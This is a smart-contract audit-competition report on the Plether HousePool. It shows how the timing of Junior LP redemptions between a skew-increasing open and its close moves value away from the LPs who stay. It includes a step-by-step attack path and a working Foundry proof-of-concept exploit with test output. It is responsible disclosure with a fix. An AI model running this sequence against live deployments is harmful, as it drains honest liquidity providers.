# \#97621 [SC-Critical] Refundable VPI sits in Junior NAV, so an LP exit settled before the close leaves the remaining LPs funding the rebate

**Submitted on Nov 2nd 2026 at 14:42:44 UTC by @Tradi3 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97621
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

A skew-increasing open pays VPI into Junior NAV, although the close can refund it. A Junior redemption settled between the open and the close is priced with that charge in NAV, and the close then pays the rebate from the LPs who stayed. Over 8 cycles in 22 hours at release parameters, on a flat price, an attacker holding half of Junior ends +385.47 USDG net of all costs and the LP who stays ends -1,338.14 USDG (-0.89%) against the no-trade baseline. With `vpiFactor = 0` the transfer disappears.

**Target:** `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`: `packages/perps/src/HousePool.sol`, `packages/perps/src/CfdEngineSettlementSidecar.sol`, `packages/perps/src/libraries/CfdEnginePlanLib.sol`

## Vulnerability Details

### Root cause

VPI is a refundable charge, but LP NAV treats it as earned revenue the moment it is paid.

1. A skew-increasing open pays VPI, which enters the pool as revenue with cash arrived (`CfdEngineSettlementSidecar.sol:458`).
2. The next reconcile books it to Junior. `settleLpEpoch` reconciles and then prices the redemption on that principal (`HousePool.sol:835`, `:840`).
3. NAV contains no offset for a potential later close rebate. The skew-reducing close produces a freshly computed, clamped rebate (`CfdEnginePlanLib.sol:1060`), paid from the pool (`CfdEngineSettlementSidecar.sol:622`).

So an LP whose redemption settles between 2 and 3 leaves with a share of the charge, and the LPs who remain pay the rebate.

The docs call VPI a round trip that cancels: "a sequence at unchanged D telescopes", and reversing a move "produces a rebate" of the same size (`WHITEPAPER.md:851-852`, `:903-904`). It nets to zero for the trader. It does not net to zero between LPs, because the LP set can change between the two legs, and the same actor controls when that happens.

The opposite sign is already protected. Negative lifetime VPI has a dedicated reserve that "cannot be extracted by LPs before its" obligation settles (`ACCOUNTING_SPEC.md:821`, `WHITEPAPER.md:887-888`). Positive, refundable VPI has no equivalent.

### Attack path

All calls are permissionless.

1. Attacker holds Junior shares and calls `juniorVault.requestRedeem` before the epoch cutoff.
2. Just before the epoch boundary, a second attacker account commits a skew-increasing open and it executes. The request cutoff applies to LP requests, not to trades.
3. After the boundary, attacker calls `router.settleLpEpoch`. The exit is priced with the VPI in NAV.
4. Attacker commits the close and it executes. The pool pays the rebate.
5. Attacker calls `claimRedeem`.
6. To repeat: request a deposit, wait for activation, wait for the one-hour cooldown, request the exit. One cycle takes about 3 hours.

The full test is in the Proof of Concept field.

## Impact Details

Using the release RiskParams, execution fee and Senior caps, an unprivileged actor holding half of the Junior tranche repeats one sequence 8 times in 22 hours on a flat price. The PoC also includes a confidence shift calibrated to the release multiplier. Compared with the same exit and re-entry without the trades:

| Over 8 cycles, 22 hours | No trade | Attack | Change |
| --- | --- | --- | --- |
| LP who stays (Junior, $150,000 stake) | 149,936.44 | 148,598.31 | **-1,338.14 (-0.89%)** |
| Attacker (LP exit plus trading account) | 189,965.09 | 190,350.57 | **+385.47** |
| Treasury execution fees | 0.00 | 959.98 | +959.98 |
| Senior | 450,098.65 | 450,098.65 | 0.00 |

The attacker's figure is net of every execution fee, the keeper bounty, and a 0.25 bp side-adverse oracle shift on each leg.

With `vpiFactor = 0`, and everything else identical, the transfer disappears: reordering the trade against settlement earns the attacker nothing, and the LP who stays does not lose.

Each cycle the attacker moves `a * V` out of the LPs who stay, where `a` is the funded share of Junior and `V` is the VPI paid, at most 0.08% of depth at the skew cap. The LP who stays ends below the no-trade baseline. A close rebate that exceeds the fee also means no close fee reaches the treasury, and that retained fee partly offsets the loss, so the figures above already include it.

At 37.5% of Junior the attacker loses 28.757459 USDG and the LP who stays loses 90.955910 USDG, a cost-to-damage ratio of 1:3.16 with no profit. At 50% the sequence is repeatably profitable net of costs, so the attacker bears no net cost at all. Capital share changes feasibility, not the impact. The effect is a NAV transfer between LP cohorts, bounded per cycle by `a * V`. Senior is unaffected.

The sequence needs live hours; a frozen close spread would break a cycle. The 1 bp basket confidence is an assumption, not a measured production value. The PoC also holds the position for about 35 seconds at a flat mocked price; real movement in that interval is untested and can add profit or loss.

### Why the documented LP timing and VPI rules do not cover this

`SECURITY.md:1038-1048` says the request cutoff is not an immutable settlement snapshot: trading, closes, claims, carry and pool accounting can change NAV during the quiet period. The docs also book positive VPI to the pool and pay rebates from it (`WHITEPAPER.md:411-412`, `:811`). Those rules describe each leg. None says who funds the refund of a positive charge when one LP cohort was paid it and a later cohort owes it back.

`ACCOUNTING_SPEC.md:731-740` lets LP ownership follow collection time for **carry**. Carry is a one-way trader debt: once collected, it stays with the pool. Positive VPI can go back on the next close, so the LPs who stay end below where they started, which the carry rule never describes.

`SECURITY.md:863-872` gives negative VPI a dedicated reserve and keeps anticipated VPI out of terminal NAV. Positive VPI has already been paid, so it is in NAV, and the refund it can trigger is not.

The closest prior item is `audits/scan-plether-fi-plether-core-d4541b49.md:1748`, an LP withdrawing before a close to enlarge the rebate through lower depth. That is a different cause. The lifetime clamp from commit `6d0aeb1` holds the rebate near the VPI paid, so depth barely moves it here: in the first cycle the close pays the trader 463.37 after the exit and 462.96 before it, a $0.42 difference, against a $234.86 swing for the attacker between the two orderings. The transfer comes from pricing the exit with the charge in NAV, so a depth-sampling fix would leave it in place.

This does not rest on the HIGH-1 clock alignment. The PoC price is flat, so no fill depends on a tick known before commit.

### Expected objection

> Positive VPI is intentionally LP revenue, redemptions remain exposed to NAV changes until funding, and VPI rebates intentionally come from the pool. An LP that exits before a close merely avoids a documented LP risk; the remaining cohort bears that risk under the same waterfall.

That joins separately documented rules without covering the refund. Carry stays with the pool once collected; positive VPI can go back on the next close. The same actor controls the open, the settlement and the close, and the `vpiFactor = 0` control removes the transfer.

## Recommended fix

Treat positive VPI on open positions as deferred, not as distributable revenue. Keep an aggregate of positive `vpiAccrued` across open positions and exclude it from the assets the waterfall distributes at reconcile and redemption pricing, releasing it as the position closes or is liquidated. This is the mirror of the existing negative-VPI reserve.

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L840
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L458
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L622
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1060
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L731-L740
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L863-L872
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1748


## Proof of Concept

## Proof of concept

Add the file below as `packages/perps/test/perps/poc/VpiExitTiming.t.sol`. No `src` changes. Run from `packages/perps`:

```bash
FOUNDRY_PROFILE=quick forge test --offline --match-path test/perps/poc/VpiExitTiming.t.sol -vv
```

It uses the production Engine, HousePool, vaults and Clearinghouse. The Router is the repo's own test fixture, `LegacyOrderRouterHarness`, which inherits `OrderRouter` and adapts the scalar `commitOrder` to the V3 entry point by self-delegatecall. Pyth and the settlement token are mocks, which the rules allow. Junior funds first, then Senior, under the release `maxSeniorShareBps` of 8000, which the setup restores because the shared fixture uses 9999. Stakes are Senior $450,000, Junior $150,000 honest and $150,000 attacker, with a 300,000 LONG on an empty book. Every exit is asserted to be fully funded, and the warps either side of the boundary are asserted. Owner configuration, token minting and the fixture's mark install are setup only. Every call in the attack path is permissionless.

Arms come from one snapshot. A settles then closes, B closes then settles, C does not trade. The control on the cause is a second contract with only `vpiFactor` set to 0.

| Per cycle unless stated, A minus C | Attacker | LP who stays |
| --- | --- | --- |
| Release VPI, one cycle | +46.73 | -165.82 |
| Release VPI, 8 cycles | +385.47 | -1,338.14 |
| Release VPI, attacker holds 37.5% of Junior | -28.76 | -90.96 |
| `vpiFactor = 0`, one cycle | -251.47 | +11.19 |

Ordering alone, A minus B, one cycle: attacker +234.86, LP who stays -233.31. With `vpiFactor = 0` the same comparison is attacker -3.74, LP who stays +3.72.

The 37.5% row is in the report on purpose. At that stake on an empty book the attacker does not profit in one cycle, though the LP who stays still loses. The `vpiFactor = 0` row is the attacker paying fees for nothing.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @dev A skew-increasing open pays VPI into HousePool as revenue. A Junior redemption settled while that position is
///      open is priced on NAV that includes the charge. The skew-reducing close then takes the rebate from the pool, so
///      the LPs who stayed fund what the exiting LP kept.
///
///      RiskParams, executionFeeBps and maxSeniorShareBps 8000 match release values; the shared fixture's 9999 is
///      restored. The two-feed mock basket uses a 2000-bps multiplier; the selected confidence input reproduces the
///      release 2500-bps shift. Production Engine, Pool, vaults, Clearinghouse and Router implementation are used via
///      the fixture adapter. Pyth and settlement token are external mocks. Each exit is asserted to be fully funded.
abstract contract VpiExitTimingBase is BasePerpTest {

    address internal constant SENIOR = address(0xA001);
    address internal constant HONEST = address(0xA002);
    address internal constant ATTACKER = address(0xA003);
    address internal constant ATTACKER_TRADER = address(0xA004);

    uint256 internal constant TRADER_FUNDS = 40_000e6;
    uint256 internal constant SENIOR_STAKE = 450_000e6;
    uint256 internal constant SIZE = 300_000e18;

    /// @dev 0.25 bp side-adverse shift at the fixture's 2000 bps multiplier, equal to 1 bp of basket confidence at the
    ///      2500 bps release multiplier.
    uint64 internal constant FEED_CONFIDENCE = 12_500;

    enum Mode {
        NoTrade,
        SettleThenClose,
        CloseThenSettle
    }

    struct Outcome {
        uint256 attackerWealth;
        uint256 honestValue;
        uint256 seniorValue;
        uint256 treasury;
    }

    function _vpiFactor() internal pure virtual returns (uint256) {
        return 0.01e18;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: _vpiFactor(),
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _priceData() internal returns (bytes[] memory data) {
        data = _mockPythUpdateData(1e8);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(100_000_000), FEED_CONFIDENCE, int32(-8), publishTime, publishTime - 1
        );
    }

    function _seed(
        uint256 honestStake,
        uint256 attackerStake
    ) internal returns (uint256 redeemRequestId) {
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(HONEST, honestStake);
        _fundJunior(ATTACKER, attackerStake);
        _fundSenior(SENIOR, SENIOR_STAKE);
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _fundTrader(ATTACKER_TRADER, TRADER_FUNDS);
        redeemRequestId = _requestExit();
    }

    function _requestExit() internal returns (uint256 requestId) {
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        requestId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
    }

    function _trade(
        uint256 margin,
        bool isClose
    ) internal {
        uint64 id = router.nextCommitId();
        vm.prank(ATTACKER_TRADER);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, margin, 0, isClose);
        router.executeOrder(id, _priceData());
        (uint256 size,,,,,,) = engine.positions(ATTACKER_TRADER);
        assertEq(size, isClose ? 0 : SIZE, "order must fill");
    }

    function _settle() internal {
        router.settleLpEpoch(_priceData());
    }

    /// @dev One exit epoch. The open lands just before the boundary, settlement runs just after it.
    function _epoch(
        uint256 requestId,
        Mode mode
    ) internal returns (uint256 redeemed) {
        uint256 start = pool.lpEpochStart(requestId);
        vm.warp(start - 30);
        assertEq(vm.getBlockTimestamp(), start - 30, "time before boundary");
        if (mode != Mode.NoTrade) {
            _trade(20_000e6, false);
        }
        vm.warp(start + 5);
        assertEq(vm.getBlockTimestamp(), start + 5, "time after boundary");
        if (mode == Mode.CloseThenSettle) {
            _trade(0, true);
        }
        _settle();
        if (mode == Mode.SettleThenClose) {
            _trade(0, true);
        }

        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ATTACKER);
        assertGt(claimable, 0, "exit must be funded");
        vm.prank(ATTACKER);
        redeemed = juniorVault.claimRedeem(requestId, claimable, ATTACKER, ATTACKER);
        assertEq(juniorVault.pendingRedeemRequest(requestId, ATTACKER), 0, "exit fully funded");
    }

    function _reenter(
        uint256 assets
    ) internal returns (uint256 requestId) {
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), assets);
        uint256 depositId = juniorVault.requestDeposit(assets, ATTACKER, ATTACKER);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(depositId) + 5);
        _settle();
        uint256 claimable = juniorVault.claimableDepositRequest(depositId, ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimDeposit(depositId, claimable, ATTACKER, ATTACKER);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        requestId = _requestExit();
    }

    function _run(
        Mode mode,
        uint256 cycles,
        uint256 honestStake,
        uint256 attackerStake
    ) internal returns (Outcome memory outcome) {
        uint256 requestId = _seed(honestStake, attackerStake);
        uint256 startedAt = vm.getBlockTimestamp();
        uint256 redeemed;
        for (uint256 i; i < cycles; ++i) {
            redeemed = _epoch(requestId, mode);
            if (i + 1 < cycles) {
                requestId = _reenter(redeemed);
            }
        }
        console2.log("elapsed hours", (vm.getBlockTimestamp() - startedAt) / 1 hours);
        outcome.attackerWealth = redeemed + clearinghouse.balanceAssets(ATTACKER_TRADER);
        outcome.honestValue = juniorVault.convertToAssets(juniorVault.balanceOf(HONEST));
        outcome.seniorValue = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR));
        outcome.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    function _arms(
        uint256 cycles,
        uint256 honestStake,
        uint256 attackerStake
    ) internal returns (Outcome memory none, Outcome memory attack, Outcome memory control) {
        uint256 snapshot = vm.snapshotState();
        none = _run(Mode.NoTrade, cycles, honestStake, attackerStake);
        vm.revertToState(snapshot);
        attack = _run(Mode.SettleThenClose, cycles, honestStake, attackerStake);
        vm.revertToState(snapshot);
        control = _run(Mode.CloseThenSettle, cycles, honestStake, attackerStake);

        _log("Arm C no trade", none);
        _log("Arm B close, then settle", control);
        _log("Arm A settle, then close", attack);
        console2.log("A-C attacker", int256(attack.attackerWealth) - int256(none.attackerWealth));
        console2.log("A-C honest  ", int256(attack.honestValue) - int256(none.honestValue));
        console2.log("A-C senior  ", int256(attack.seniorValue) - int256(none.seniorValue));
        console2.log("A-C treasury", int256(attack.treasury) - int256(none.treasury));
        console2.log("A-B attacker", int256(attack.attackerWealth) - int256(control.attackerWealth));
        console2.log("A-B honest  ", int256(attack.honestValue) - int256(control.honestValue));
    }

    function _log(
        string memory label,
        Outcome memory outcome
    ) internal pure {
        console2.log(label);
        console2.log("  attacker wealth", outcome.attackerWealth);
        console2.log("  honest junior  ", outcome.honestValue);
        console2.log("  senior         ", outcome.seniorValue);
        console2.log("  treasury       ", outcome.treasury);
    }

}

contract VpiExitTimingTest is VpiExitTimingBase {

    function test_OneCycle_HalfOfJunior() public {
        (Outcome memory none, Outcome memory attack, Outcome memory control) = _arms(1, 150_000e6, 150_000e6);
        assertGt(attack.attackerWealth, none.attackerWealth, "attacker profits net of every cost");
        assertLt(attack.honestValue, none.honestValue, "LP who stays is below the no-trade baseline");
        assertGt(attack.attackerWealth, control.attackerWealth, "ordering is what pays");
        assertLt(attack.honestValue, control.honestValue, "ordering is what costs the stayer");
    }

    function test_EightCycles_HalfOfJunior() public {
        (Outcome memory none, Outcome memory attack,) = _arms(8, 150_000e6, 150_000e6);
        assertGt(attack.attackerWealth, none.attackerWealth, "attacker profits net of every cost");
        assertLt(attack.honestValue, none.honestValue, "LP who stays is below the no-trade baseline");
    }

    /// @dev Below the profit threshold: the stayer still loses, the attacker no longer profits.
    function test_OneCycle_SmallerStake() public {
        (Outcome memory none, Outcome memory attack,) = _arms(1, 187_500e6, 112_500e6);
        assertLt(attack.attackerWealth, none.attackerWealth, "no profit at this stake");
        assertLt(attack.honestValue, none.honestValue, "LP who stays still loses");
    }

}

/// @dev Control on the claimed cause: identical stack and sequence, with only vpiFactor set to 0.
contract VpiExitTimingZeroVpiControl is VpiExitTimingBase {

    function _vpiFactor() internal pure override returns (uint256) {
        return 0;
    }

    function test_ZeroVpi_NoTransfer() public {
        (Outcome memory none, Outcome memory attack, Outcome memory control) = _arms(1, 150_000e6, 150_000e6);
        assertLe(attack.attackerWealth, control.attackerWealth, "ordering pays nothing without VPI");
        assertLt(attack.attackerWealth, none.attackerWealth, "attacker only pays costs without VPI");
        assertGe(attack.honestValue, none.honestValue, "LP who stays is not hurt without VPI");
    }

}
```

Output on a clean clone at the pin, 4 of 4 passing, with the `Logs:` headers and elapsed-hours lines trimmed:

```text
Ran 1 test for test/perps/poc/VpiExitTiming.t.sol:VpiExitTimingZeroVpiControl
[PASS] test_ZeroVpi_NoTransfer() (gas: 33118015)
  Arm C no trade
    attacker wealth 189993834445
    honest junior   149993825368
    senior          450012335615
    treasury        0
  Arm B close, then settle
    attacker wealth 189746106065
    honest junior   150001302788
    senior          450012336757
    treasury        240000000
  Arm A settle, then close
    attacker wealth 189742365987
    honest junior   150005018114
    senior          450012336757
    treasury        240000000
  A-C attacker -251468458
  A-C honest   11192746
  A-C senior   1142
  A-C treasury 240000000
  A-B attacker -3740078
  A-B honest   3715326
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 144.19ms (118.14ms CPU time)
Ran 3 tests for test/perps/poc/VpiExitTiming.t.sol:VpiExitTimingTest
[PASS] test_EightCycles_HalfOfJunior() (gas: 180801252)
  Arm C no trade
    attacker wealth 189965094082
    honest junior   149936444731
    senior          450098646964
    treasury        0
  Arm B close, then settle
    attacker wealth 188460045211
    honest junior   150476319691
    senior          450098648105
    treasury        959976000
  Arm A settle, then close
    attacker wealth 190350568216
    honest junior   148598308414
    senior          450098648105
    treasury        959976000
  A-C attacker 385474134
  A-C honest   -1338136317
  A-C senior   1141
  A-C treasury 959976000
  A-B attacker 1890523005
  A-B honest   -1878011277
[PASS] test_OneCycle_HalfOfJunior() (gas: 33194444)
  Arm C no trade
    attacker wealth 189993834445
    honest junior   149993825368
    senior          450012335615
    treasury        0
  Arm B close, then settle
    attacker wealth 189805699675
    honest junior   150061312381
    senior          450012336757
    treasury        119997000
  Arm A settle, then close
    attacker wealth 190040559827
    honest junior   149828006564
    senior          450012336757
    treasury        119997000
  A-C attacker 46725382
  A-C honest   -165818804
  A-C senior   1142
  A-C treasury 119997000
  A-B attacker 234860152
  A-B honest   -233305817
[PASS] test_OneCycle_SmallerStake() (gas: 33193791)
  Arm C no trade
    attacker wealth 152495375834
    honest junior   187492283967
    senior          450012335615
    treasury        0
  Arm B close, then settle
    attacker wealth 152290369310
    honest junior   187576642734
    senior          450012336757
    treasury        119997000
  Arm A settle, then close
    attacker wealth 152466618375
    honest junior   187401328057
    senior          450012336757
    treasury        119997000
  A-C attacker -28757459
  A-C honest   -90955910
  A-C senior   1142
  A-C treasury 119997000
  A-B attacker 176249065
  A-B honest   -175314677
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 357.08ms (525.07ms CPU time)
Ran 2 test suites in 363.55ms (501.26ms CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
```

